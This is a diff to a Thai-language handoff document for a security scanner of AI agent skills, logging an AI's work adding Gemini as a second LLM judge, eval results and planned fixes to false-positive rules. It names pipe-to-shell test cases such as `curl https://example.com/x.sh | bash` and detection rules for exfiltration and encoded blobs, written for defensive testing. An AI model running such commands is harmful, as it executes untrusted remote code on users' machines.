@@ -93,6 +93,45 @@
 
 **ข้อควรรู้เรื่อง cache:** ผลเก่าของ repo หลาย skill ที่เก็บไว้ยังขึ้นตามเดิมจนกว่าจะมี commit ใหม่หรือ bump `SCANNER_VERSION` เพราะ cache ผูกกับ commit + เวอร์ชันตัวสแกน ไม่ได้ผูกกับ `LIMITS` ถ้าอยากให้รายงานเก่าได้ผลใหม่ ให้ bump ไปพร้อมงานข้อ 8.3
 
+## อัปเดตโดย Claude (Sonnet 5.5) เมื่อ 2026-11-11 — เพิ่ม Gemini เป็น judge ตัวที่สอง
+
+ผู้แก้ไขและเขียนบันทึกส่วนนี้คือ **Claude (Sonnet 5.5)** เจ้าของโปรเจกต์เลือก Gemini เป็นตัวสำรองของ Groq (ตัวเลือกอื่นที่ค้นดูแล้วอยู่ในประวัติแชท: OpenRouter `:free` จำกัด 50 ครั้ง/วัน, Mistral ต้องยอมให้ใช้ข้อมูลฝึกโมเดล, Cerebras เลิกแผนฟรีถาวร)
+
+**สถานะ: ยืนยันกับ API จริงแล้ว (key อยู่ใน `.env.local` ของเครื่องเจ้าของโปรเจกต์) เปิดใช้บนเว็บจริงยังไม่ได้ทำ** รูปคำขอที่ส่ง (ไม่ส่ง `temperature`/max tokens) Google รับได้ ผลทดสอบกับโมเดล `gemini-3.5-flash-lite`: fixture อันตราย → 6 ข้อค้นพบที่ถูกต้อง หลักฐานผ่านการตรวจหมด / fixture ปกติ → ไม่มีข้อค้นพบ และ `purpose_mismatch` เป็น false ใช้เวลา 3–18 วินาทีต่อครั้ง (ส่วนใหญ่ 6–10) ประมาณ 2,300 token เข้า และ 2,000 ออก ขั้นตอนต่อไป: ดูผล `npm run eval -- --judge --provider gemini` เทียบกับ Groq แล้วถ้าคุณภาพไม่ตกกว่า ค่อยตั้ง `JUDGE_PROVIDERS=groq,gemini` และ `GEMINI_API_KEY` ใน Vercel
+
+**บั๊กที่เจอตอนทดสอบกับ Gemini จริง (แก้แล้ว):**
+1. **`extractJson` พังเมื่อหลักฐานมี ``` อยู่ข้างใน** (เกิดเมื่อ skill ที่ตรวจมีบล็อกโค้ด ```bash แล้วโมเดลยกมาเป็นหลักฐาน) โค้ดเดิมเห็น ``` ข้างใน string แล้วเข้าใจว่าคำตอบทั้งก้อนถูกห่อด้วย code fence จึงตัดเฉพาะข้างในไปหา JSON ไม่เจอ ("no JSON object in reply") ล้มราว 1 ใน 3 ของการเรียก ตอนนี้ลอง parse ทั้งก้อนก่อน แล้วค่อยถอดจาก fence หรือหาปีกกานอกสุด ไม่เกี่ยวกับผู้ให้บริการ จึงแก้ปัญหาที่ Groq อาจเจอได้ถ้าโมเดลยกบล็อกโค้ดมาเป็นหลักฐาน ไม่กระทบ cache ของ eval (คีย์ผูกกับโมเดล/เวอร์ชัน/ไฟล์ ไม่ผูกกับตัว parse)
+2. **Gemini ตอบ 503 UNAVAILABLE ("โมเดลมีคนใช้เยอะ") ชั่วคราว** ราว 1 ใน 5 ของการเรียกที่วัดได้ ตอนนี้ลองใหม่สูงสุด 2 ครั้ง (รอ 1.5 วินาที แล้ว 3 วินาที) ถ้าเวลาไม่พอสำหรับผู้ให้บริการตัวถัดไปในสายสำรอง จะไม่รอ เฉพาะ Gemini ส่วน Groq ยังเหมือนเดิม (503 รายงานทันที)
+หลังแก้: เรียกผ่านตัวเชื่อมจริง 16 ครั้ง สำเร็จ 16 ครั้ง
+
+**ผล eval ของ Gemini (Claude, 2026-11-11, `gemini-3.5-flash-lite`, ครบ 120 เคส, ใช้ไป ~120 ครั้งจากโควตา 500 ครั้ง/วัน)** — ยังไม่ได้ใส่ใน README เพราะงานตั้งเวลา (2026-11-12 14:00) จะเขียนทับหัวข้อ Groq ใน README ให้เติมหลังจากนั้น
+| | กฎอย่างเดียว | กฎ + Gemini |
+|---|---|---|
+| จับได้ รวมจุดบอด medium+ / high+ | 71% / 57% | **91% / 86%** |
+| เตือนผิด skill จริงทั่วไป medium+ / high+ | 1/49 / 0/49 | 4/49 / 3/49 |
+| Precision medium+ / high+ | 89% / 95% | 84% / 86% |
+จุดบอด 10 จุด Gemini จับได้ 7 (ไม่ได้: `unpinned-npx`, `hardcoded-key`, `frontmatter-invalid`; Groq จับ `hardcoded-key` ได้) การตรวจหลักฐานทิ้ง finding ของ Gemini 5 รายการ (Groq 1)
+
+**อ่านตัวเลขเตือนผิดอย่างระวัง (ตรวจโค้ดจริงแล้ว):**
+- `web-design-guidelines` และ `writing-guidelines` (vercel-labs) ที่ Gemini ยกเป็น high **ไม่ใช่การเตือนผิด** skill สั่งให้ดึงกฎจาก URL ภายนอกทุกครั้งแล้วทำตามเนื้อหานั้น ตรงกับ SUP-04 ในสเปก (ระดับ high ตรวจสอบไม่ได้) ชุดวัดผลตีความ skill กลุ่ม `general` ว่าไม่ควรถูกเตือนเลยจึงนับเป็นเตือนผิด ควรแยกเคส "ดึงคำสั่งจากภายนอก" ออกเป็นหมวดของมันเอง
+- **Gemini ไม่นิ่ง และสั่งให้นิ่งไม่ได้:** `pptx` (skill จริง) และ `plain-download` (`curl -fsSL -o data.csv … && wc -l`) ถูกยกเป็น high ใน eval แต่ตรวจซ้ำไม่ถูกเตือน ทดสอบ `plain-download` 8 ครั้ง: ไม่ตั้ง temperature ได้ none_found 4 / high 4 (`llm.remote-code-or-instructions` ความมั่นใจ 1.0) ส่ง `temperature: 0` ก็ได้ผลเท่าเดิม 4/4 (endpoint รับค่าไม่ error แต่ไม่ช่วยให้นิ่ง) จึงยัง**ไม่ส่ง** temperature
+- **ข้อสรุปชั่วคราว:** ใช้ Gemini เป็นตัวสำรองได้ แต่ไม่ควรเป็นตัวหลัก ผลของการสแกนหนึ่งครั้งถูก cache ตาม commit จึงไม่เปลี่ยนในรายงานเดิม แต่ผลของ commit ใหม่ของ skill เดิมอาจต่างกันได้ ทางแก้ที่ควรพิจารณา (ยังไม่ได้ทำ): ให้ finding ที่มาจาก LLM ล้วน (ไม่มีกฎยืนยัน) ถูกจำกัดที่ระดับ medium เว้นแต่เป็นหมวดที่สเปกระบุ (เช่น reviewer_manipulation) หรือขอให้ตอบซ้ำแล้วเอาตัวที่เห็นตรงกัน — ต้องวัดด้วย eval ก่อนใช้ และเปรียบเทียบกับผล Groq ฉบับเต็มหลังงาน 14:00 วันที่ 12 พ.ย. ก่อนตัดสินว่าใครเป็นตัวหลัก
+
+| ไฟล์ | ขอบเขตงานของ Claude |
+|---|---|
+| `src/lib/judge/openai-compat.ts` (ใหม่) | แกนกลางของ judge ที่คุยแบบ OpenAI chat-completions: `OpenAICompatJudge` (ตัวเลือกต่อผู้ให้บริการ: endpoint, โมเดล, `temperature`, พารามิเตอร์จำกัดความยาว, `extraBody`, `serverErrorRetries` สำหรับ 5xx ชั่วคราว), `QuotaError`, `toStrictSchema` ย้ายมาจาก `groq.ts` |
+| `src/lib/judge/groq.ts` | เหลือแค่ตัวกำหนดค่าของ Groq บนแกนกลาง **คำขอที่ส่งเหมือนเดิมทุกอย่าง** (temperature 0, `max_completion_tokens` 3000, `reasoning_effort: "low"`, strict schema) ชื่อโมเดลที่บันทึกยังเป็น `groq/openai/gpt-oss-120b` จึงไม่กระทบ cache ผล AI ของ eval |
+| `src/lib/judge/gemini.ts` (ใหม่) | `GeminiJudge` ผ่าน `https://generativelanguage.googleapis.com/v1beta/openai/chat/completions` โมเดลเริ่มต้น `gemini-3.5-flash-lite` (รุ่น Flash-Lite ที่ Google ระบุว่า stable แต่เอกสารไม่บอกว่าอยู่ในแผนฟรีหรือไม่) **ตั้งใจไม่ส่ง `temperature` และ max tokens** เพราะเอกสารไม่ระบุว่า endpoint นี้รับหรือไม่ ส่ง `reasoning_effort` ก็ต่อเมื่อตั้ง `GEMINI_REASONING_EFFORT` |
+| `src/lib/judge/fallback.ts` (ใหม่) | `FallbackJudge` ลองทีละตัวตามลำดับ ล้มด้วยเหตุใดก็ตาม (โควตา ล่ม timeout) ก็ไปตัวถัดไป ทุกตัวล้มจึงโยน error ล่าสุด (สแกนจะใช้กฎอย่างเดียว) `model` บอกตัวที่ตอบจริง และสร้าง prompt ตามขนาดของตัวที่เล็กที่สุด |
+| `src/lib/judge/index.ts` | แก้ `extractJson` ตามบั๊กข้อ 1 ด้านล่าง และเพิ่ม `getJudge({ provider })`: ระบุ `provider` = ตัวนั้นตัวเดียว ไม่มี fallback และไม่ดู `JUDGE_PROVIDERS` / ไม่ระบุ = ตาม `JUDGE_PROVIDERS` (ค่าเริ่มต้น `groq` ตัวเดียว) ข้ามตัวที่ไม่มี key เมื่อมี 2 ตัวขึ้นไป timeout ต่อตัว 22 วินาทีเพื่อให้ตัวที่สองมีเวลา (การสแกนมี 60 วินาที) |
+| `scripts/eval.ts` | เพิ่ม `--provider groq\|gemini` (ค่าเริ่มต้น groq) **eval ไม่มีวันใช้ fallback หรือ `JUDGE_PROVIDERS`** เพราะรันที่ปนหลายโมเดลให้ตัวเลขที่ไม่ใช่ของโมเดลไหนเลย ถ้าไม่มี key ของตัวที่ขอ จะหยุดพร้อมข้อความ ไม่สลับไปตัวอื่นเงียบๆ หัวข้อผลบอกชื่อโมเดลที่ใช้ |
+| `scripts/judge-smoke.ts` | รับอาร์กิวเมนต์ที่สอง `groq\|gemini` ไว้ทดสอบทีละเจ้า |
+| `src/lib/judge/providers.test.ts` (ใหม่) | เทส 28 ข้อ: รูปคำขอของ Groq ต้องไม่เปลี่ยน, Gemini, fallback, ลำดับ provider, `getJudge` กับ env ต่างๆ (ใช้ `vi.stubEnv` ไม่ยิง API จริง) |
+
+**ความปลอดภัยต่อ eval ที่ตั้งเวลาไว้ (2026-11-12 14:00):** ใช้คำสั่ง `eval.ts --judge` ไม่ระบุ provider จึงเป็น Groq ตัวเดียวเหมือนเดิม ไม่ว่าจะมี `GEMINI_API_KEY` หรือ `JUDGE_PROVIDERS` ในเครื่องหรือไม่ และไม่ได้เปลี่ยน `SCANNER_VERSION` หรือ `PROMPT_VERSION`
+
+**ข้อควรรู้เรื่อง Gemini:** เอกสารของ Google ย้ายไป aistudio.google.com/docs และเน้น API ตัวใหม่ `/v1beta/interactions` (รูปแบบคำตอบแบบ REST ไม่ได้แสดงในเอกสาร จึงไม่ได้ใช้) แผนฟรีไม่มีตัวเลขโควตาที่เผยแพร่ในเอกสาร แต่หน้า AI Studio → Rate limits ของ "Default Gemini Project" (ภาพจากเจ้าของโปรเจกต์ 2026-11-11) แสดงของ **Gemini 3.5 Flash Lite: 15 RPM, 250K TPM, 500 RPD** (เทียบ Groq gpt-oss-120b: 30 RPM, 8K TPM, 1K RPD, 200K TPD) ตัวจำกัดของ Gemini คือจำนวนครั้งต่อนาที/วัน ไม่ใช่ขนาด prompt จึงส่งเนื้อหาให้อ่านได้มากกว่า Groq (ตอนนี้ตั้ง 30,000 ตัวอักษร ปรับเพิ่มได้ด้วย `JUDGE_MAX_INPUT_CHARS`) เว็บเตือน "nearing a rate limit, set up billing" เมื่อ eval ยิงใกล้ 15 RPM ไม่ต้องผูกบัญชีเรียกเก็บเงิน โควตาคิดต่อ project (ไม่ใช่ต่อ key) และรีเซ็ตเที่ยงคืนเวลา Pacific เมื่อเกินจะตอบ HTTP 429 `RESOURCE_EXHAUSTED` โดยเอกสารไม่ระบุ header บอกเวลารอ ค่า `parseRetryAfter` จึงเป็น 60 วินาทีเมื่อไม่มี header
+
 ---
 
 ## 1. โปรเจคนี้คืออะไร
@@ -279,7 +318,10 @@ npm run db:generate -- --name <ชื่อ> && npm run db:migrate
 |---|---|---|---|
 | `DATABASE_URL` | ✅ | ✅ (มาจาก Neon integration) | ห้ามพิมพ์ค่าออกมา |
 | `GROQ_API_KEY` | ✅ | ❌ | ถ้ามีค่า judge จะเปิด |
-| `SCANNER_MODEL` | — | — | ค่าเริ่มต้นคือ `openai/gpt-oss-120b` |
+| `GROQ_MODEL` (ชื่อเดิม `SCANNER_MODEL` ยังใช้ได้) | — | — | ค่าเริ่มต้นคือ `openai/gpt-oss-120b` |
+| `GEMINI_API_KEY` | ยังไม่มี | ❌ | judge ตัวที่สอง ดูบันทึกของ Claude ด้านบน |
+| `GEMINI_MODEL`, `GEMINI_REASONING_EFFORT` | — | — | ค่าเริ่มต้น `gemini-3.5-flash-lite` และไม่ส่ง `reasoning_effort` |
+| `JUDGE_PROVIDERS` | — | — | ลำดับที่ลอง เช่น `groq,gemini` ค่าเริ่มต้น `groq` ตัวเดียว (eval ไม่อ่านค่านี้) |
 | `JUDGE_MAX_INPUT_CHARS` | — | — | ค่าเริ่มต้นของ Groq คือ 14000 (เพราะเพดาน 8K token/นาที) |
 | `GITHUB_TOKEN` | — | ❌ | ไม่ใส่ก็ได้ ถ้าใส่จะได้โควตา API มากขึ้น ผู้ใช้เลือกยังไม่ทำ |
 
@@ -331,6 +373,20 @@ npm run db:generate -- --name <ชื่อ> && npm run db:migrate
 ---
 
 ## 8. งานถัดไป (เรียงตามที่แนะนำ)
+
+**ทำก่อนข้ออื่น แต่ต้องรอหลัง eval ที่ตั้งเวลาไว้ (2026-11-12 14:00) รันเสร็จและ commit README แล้ว — เจ้าของโปรเจกต์ตกลงแล้ว (Claude, 2026-11-11)**
+แก้การเตือนผิดที่เจอกับ repo จริง `K-Dense-AI/scientific-agent-skills` (commit `2d2065fb4520fa3f3f2bcf61cff26ec8b7eba4b5`, รายงานบนเว็บจริงได้ "วิกฤต 20/100" จาก 14 รายการ ทั้งที่ตรวจโค้ดจริงแล้วไม่มีรายการไหนเป็นอันตราย) ต้อง bump `SCANNER_VERSION` ซึ่งทำให้ cache ผล AI ของ eval ใช้ไม่ได้ จึงต้องรอ eval รอบนั้นเสร็จก่อน และไม่ควรเพิ่มเคสใหม่ในชุดวัดผลก่อนหน้านั้น เพราะจะทำให้ตัวเลขเทียบกับผลเดิมไม่ได้
+
+| กฎ | บั๊ก | แนวทางแก้ |
+|---|---|---|
+| `script.pipe-to-shell` (ต้นเหตุของ "วิกฤต" 4 รายการ) | `curl … \| python3 arxiv_atom.py -` ถูกนับว่ารันโค้ดจาก internet ทั้งที่รันไฟล์ในเครื่องและ pipe แค่**ข้อมูล**เข้า stdin | ตัวแปลภาษา (`sh`, `bash`, `python3`, `node` …) ที่รับ pipe ต้องไม่มีชื่อไฟล์สคริปต์ตามหลัง (มีได้แค่แฟลกอย่าง `-`, `-s`, `-c`) `python3 -` อ่านโปรแกรมจาก stdin จึงยังต้องจับ ส่วน `python3 script.py -` ไม่ใช่ |
+| `hidden.encoded-blob` | สตริงตัวอักษรล้วนยาวเกิน 200 ตัวถูกนับเป็น base64 (เจอกับลำดับโปรตีน GFP ใน `diffdock/scripts/prepare_batch_csv.py:207`) | base64 จริงมีทั้งตัวพิมพ์เล็ก ตัวพิมพ์ใหญ่ และตัวเลข ให้ตรวจครบทั้งสามอย่างก่อน ลำดับ DNA/โปรตีนจะไม่โดน |
+| `script.exfiltration` | ทุก `requests.post` / `fetch POST` ถูกเตือนระดับ medium แม้ส่งไป API ที่ skill ประกาศ (OpenRouter, parallel.ai พร้อม key ของผู้ใช้เอง) ซึ่งสเปกบอกว่าไม่ใช่ finding | ลดเป็น info หรือเตือนเมื่อมีการอ่านข้อมูลลับในไฟล์เดียวกัน (`script.credential-exfil` ยังทำงานตามเดิม) ส่วน `curl -d @ไฟล์` / `--data-binary @ไฟล์` (ส่งไฟล์ในเครื่อง) ให้คงระดับเดิม |
+| `script.disable-security` (`verify=False`) | จับทั้งประโยคที่เตือนว่า "never use `verify=False`" (`labarchive-integration/SKILL.md:183`) และพารามิเตอร์ของไลบรารีอื่นที่ไม่เกี่ยวกับ SSL (`scikit-bio/SKILL.md:318`) | ข้ามถ้าบรรทัดมีคำปฏิเสธ (`never`, `don't`, `avoid`, `ห้าม`) และใน markdown ให้เตือนเฉพาะเมื่อบรรทัดเดียวกันพูดถึง `requests`/`httpx`/`ssl`/`tls`/`https`/certificate |
+
+ขั้นตอน: (1) เขียนเคสสำหรับ `fixtures/eval/tricky.json` จากบรรทัดจริง 7 บรรทัดข้างบน (ย่อให้สั้นและ defang แล้ว ไม่ต้องคัดลอกไฟล์ทั้งหมด) และเคสอันตรายคู่กันที่ต้องยังจับได้ เช่น `curl https://example.com/x.sh | bash`, `curl … | python3 -`, `base64` ผสมตัวเลข (2) รัน `npm run eval` ให้เห็นว่าเคสใหม่ล้มก่อนแก้ (3) แก้ 4 กฎ (4) bump `SCANNER_VERSION` เป็น `0.3.2` (5) รัน `npm run eval` และ `npm run eval -- --judge` (ใช้โควตา Groq ทั้งวัน เพราะ cache เก่าใช้ไม่ได้) แล้วอัปเดต README (6) สแกน `K-Dense-AI/scientific-agent-skills` บนเว็บจริงซ้ำ ผลต้องไม่เป็นวิกฤต เหลือแค่ระดับต่ำ (sudo ในคำแนะนำติดตั้ง) พร้อมส่งต่อให้เจ้าของโปรเจกต์ลองเทส
+
+หมายเหตุ: รายงานของ `trailofbits/skills` ที่ถูกสแกนบนเว็บจริงไว้ที่ 200 ไฟล์ (ก่อนเพดานใหม่ 400) ก็จะรีเฟรชเมื่อ bump เวอร์ชัน
 
 1. **ให้หน้ารายงานแสดงผลจาก AI** ⭐ ต้องมีก่อนเปิด LLM บนเว็บ และไม่ต้อง bump `SCANNER_VERSION`
    - เพิ่ม migration ให้ `scans` มีคอลัมน์ เช่น `judge_model`, `stated_purpose`, `observed_behaviors` (jsonb), `purpose_mismatch` (jsonb), `dual_use`, `judge_status` (`ran`/`skipped`/`failed`/`quota`)
